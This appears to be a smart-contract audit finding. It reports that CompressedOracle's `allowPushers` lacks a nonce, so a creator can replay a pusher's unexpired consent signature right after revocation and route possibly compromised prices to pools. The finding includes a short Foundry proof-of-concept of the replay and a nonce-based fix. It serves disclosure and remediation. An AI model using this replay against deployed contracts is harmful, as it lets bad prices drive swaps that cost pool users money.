### Title
Pusher self-revocation can be silently replayed by the creator within the deadline window, allowing compromised prices to reach pools — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracle.allowPushers` accepts any EIP-191 consent signature whose deadline has not yet expired, with no nonce or post-revocation guard. After a pusher calls `revokePusher`, the creator can immediately replay the original consent signature (deadline still valid) to restore `namespaceRemapping[pusher] = creator`. The pusher's self-revocation is silently undone in the same block, and subsequent pushes continue to land in the creator's namespace rather than the pusher's own.

---

### Finding Description

`allowPushers` sets `namespaceRemapping[pusher] = msg.sender` after verifying the pusher's EIP-191 signature over the domain:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no "already-revoked" flag, and no check that `namespaceRemapping[pusher]` is currently zero. The same signature is accepted on every call as long as `block.timestamp <= deadline`.

`revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [2](#0-1) 

But because `allowPushers` carries no replay protection beyond the deadline, the creator can call it again immediately with the identical signature bytes, restoring `namespaceRemapping[pusher] = creator` in the same block as the revocation.

The code comment explicitly acknowledges the replay risk ("an undated signature could re-establish a delegation AFTER the pusher revoked it") and presents the deadline as the mitigation. [3](#0-2) 

However, the deadline only prevents replay **after** it expires. Within the deadline window — which the pusher chose when signing, and which can be arbitrarily long — replay is unrestricted. This is the direct analog of the GoGoPool ordering bug: a "register then unregister" sequence where the unregister step (`revokePusher`) is immediately undone by replaying the register step (`allowPushers`) with the same key.

The fallback push path resolves the effective namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So after the creator replays the delegation, every subsequent fallback push from the pusher lands in the creator's namespace, not the pusher's own — exactly as before the revocation.

---

### Impact Explanation

A pusher who discovers their price data is compromised (private key leaked, calculation bug, feed source corrupted) calls `revokePusher` to stop their data from reaching pools. The creator immediately replays the original consent signature to restore the delegation. The pusher, believing they have successfully revoked, continues pushing. Their pushes land in the creator's namespace. Pools registered for the creator's `feedId`s via `OracleBase.register` receive the compromised mid/spread values through the attributed `price(feedId, pool)` path, and execute swaps at bad bid/ask quotes — a direct bad-price execution impact. [5](#0-4) 

---

### Likelihood Explanation

Medium. Three conditions must hold simultaneously: (1) the pusher holds a still-valid consent signature (deadline in the future), (2) the pusher calls `revokePusher` believing it is permanent, and (3) the creator replays the signature before the pusher stops pushing. Condition (3) is trivially cheap — a single transaction. Condition (2) is the normal revocation flow. Condition (1) is the common case: pushers sign long-lived consents to avoid repeated signing overhead. The pusher has no on-chain way to detect that the delegation was re-established without monitoring `namespaceRemapping` after every block.

---

### Recommendation

Add a per-pusher nonce to the signature domain and increment it on every successful `allowPushers` call and on every `revokePusher`/`removePushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // <-- added
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;        // <-- invalidates all prior signatures
namespaceRemapping[pusher] = msg.sender;

// In revokePusher / removePushers:
pusherNonce[msg.sender]++;    // <-- invalidates any outstanding consent
namespaceRemapping[msg.sender] = address(0);
```

This ensures that every revocation invalidates all prior consent signatures, making re-delegation require a fresh signature from the pusher.

---

### Proof of Concept

```solidity
// Setup: pusher signs a consent for creator with deadline = now + 1 day
uint256 deadline = block.timestamp + 1 days;
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, hash);
bytes memory sig = abi.encodePacked(r, s, v);

address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;

// Step 1: Creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator);

// Step 2: Pusher revokes (e.g., their key is compromised)
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// Step 3: Creator replays the IDENTICAL signature — deadline still valid
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);            // no revert
assertEq(oracle.namespaceRemapping(pusher), creator);    // silently restored

// Step 4: Pusher's subsequent fallback pushes land in creator's namespace
// → pools registered for creator's feedIds receive compromised prices
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-192)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-210)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/providers/OracleBase.sol (L160-172)
```text
    function price(bytes32 feedId, address pool)
        external
        feedExists(feedId)
        notBlacklisted
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        require(pool != address(0) && IPool(pool).inSwap() == msg.sender, InvalidInSwap());
        require(!blacklisted[pool], Blacklisted(pool));
        require(registeredPool[feedId][pool], NotRegistered(feedId, pool));

        (mid, spread, spread1, refTime) = _readPrice(feedId);
        emit PriceRead(pool, feedId);
    }
```
